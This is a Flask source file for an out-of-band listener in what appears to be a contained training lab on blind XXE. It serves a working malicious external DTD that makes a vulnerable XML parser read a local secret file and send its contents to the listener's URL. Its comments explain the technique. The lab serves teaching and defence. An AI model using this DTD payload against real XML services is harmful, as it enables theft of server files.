import os
import logging
from flask import Flask, request, Response

logging.basicConfig(level=logging.INFO)  # ensure INFO lines reach docker compose logs
app = Flask(__name__)

# The attacker-hosted external DTD. The vulnerable parser fetches it while resolving the external
# parameter entity -- that fetch is the first out-of-band callback (proof of blind XXE). The DTD
# then makes the parser read a local file (file:///app/secret.txt) and send its contents back in
# a SECOND request, so the file is exfiltrated over the out-of-band channel. Single-line, URL-safe
# file content only: a newline or a '&'/'%'/'>' in the file breaks the constructed URI (a real
# libxml2 limitation), which is why the lab's secret is a controlled single-line marker.
EVIL_DTD = (
    b'<!ENTITY % file SYSTEM "file:///app/secret.txt">\n'
    b'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
    b"'http://oob-listener/proof-xxe-30/exfil?x=%file;'>\">\n"
    b"%eval;\n"
    b"%exfil;\n"
)


# oob-listener: a dumb out-of-band sink. It logs every inbound request so the student can confirm,
# via `docker compose logs oob-listener`, that the PARSER reached out. Self-hosted, air-gapped
# analog of a public interaction server (e.g. Burp Collaborator). TRIPWIRE, not a target: it holds
# no secret and is reachable ONLY from inside the Docker network (no host port). The secret that
# arrives in the exfil request is the vulnerable APP's own file, not the listener's.
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch(path):
    qs = request.query_string.decode()
    app.logger.info("OOB HIT path=/%s%s from=%s", path, ("?" + qs) if qs else "", request.remote_addr)
    if path.endswith(".dtd"):
        return Response(EVIL_DTD, mimetype="application/xml-dtd")
    return "ok"


if __name__ == "__main__":
    app.run(host=os.environ.get("HOST", "127.0.0.1"), port=80)
